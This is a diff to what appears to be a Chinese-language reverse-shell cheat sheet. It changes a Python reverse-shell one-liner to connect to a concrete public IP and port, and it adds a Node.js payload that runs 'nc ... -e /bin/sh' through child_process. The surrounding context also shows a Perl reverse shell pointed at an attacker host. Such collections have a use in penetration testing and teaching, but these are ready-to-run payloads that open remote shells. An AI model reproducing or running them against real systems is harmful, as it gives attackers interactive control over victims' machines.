@@ -179,7 +179,7 @@ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4
 ### 0x05 Python 版本：
 
 ```
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("39.108.164.219",60003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 另外的形式：
@@ -236,6 +236,18 @@ crontab -e 编辑当前用户的任务，或者是写到计划任务目录，一
 ```
 
 最后其实发现，虽然形式不同，但是其实都是基于 / bin/bash 和 / bin/sh
+
+
+
+### nodejs
+
+```
+global.process.mainModule.constructor._load('child_process').exec('nc vps-ip port -e /bin/sh',function(){});
+```
+
+
+
+
 
 ### 0x10 参考
 
